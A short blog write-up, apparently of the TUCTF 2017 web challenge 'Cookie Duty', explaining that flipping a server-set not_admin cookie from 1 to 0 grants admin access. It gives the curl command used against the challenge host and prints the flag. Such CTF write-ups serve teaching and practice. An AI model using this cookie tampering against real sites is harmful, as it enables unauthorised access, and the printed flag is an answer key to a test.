---
layout: post
title: "Solution to TUCTF 2017 Cookie Duty"
author: capitol
category: ctf
---
![cookies](/images/cookies.jpg)

##### name:
Cookie Duty

##### category:
web

##### points:
50

#### Writeup

We were presented with a page that had a simple form to set a name. The server set a cookie named not_admin to 1 when the form was posted.

To get the flag we simply changed the cookie value to 0 and requested the page again, like this: 
```bash
curl 'http://cookieduty.tuctf.com/index.php' -H 'Host: cookieduty.tuctf.com' -H 'Cookie: not_admin=0; user=dGVzdA%3D%3D'
```

flag was TUCTF{D0nt_Sk1p_C00k13_Duty}
